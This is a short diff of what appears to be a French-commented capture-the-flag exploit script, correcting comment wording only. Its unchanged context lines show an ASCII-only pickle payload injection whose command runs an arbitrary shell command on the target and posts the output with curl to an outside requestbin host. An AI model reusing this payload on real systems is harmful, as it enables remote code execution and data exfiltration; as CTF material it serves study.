@@ -28,7 +28,7 @@ class Requestbin:
 
 
 def encrypt(username, host, port):
-    # ajout d'un prefix aléatoire de taille fixe
+    # ajout d'un préfixe aléatoire de taille fixe
     # pour que chaque username soit unique
     prefix = bytes([random.randint(0x20, 0x7e) for _ in range(4)])
 
@@ -95,7 +95,7 @@ if __name__ == '__main__':
     # payload
     log.info("Injection du payload")
 
-    # le challenge ici n'est d'utiliser que de l'ascii
+    # le challenge ici est d'utiliser uniquement de l'ASCII
     # ce qui est au final simple avec pickle (voir /usr/lib/python3.5/pickle.py)
     requestbin = Requestbin()
     cmd = 'curl -X POST -d "$(%s)" http://requestb.in/%s' % (args.cmd, requestbin.name)
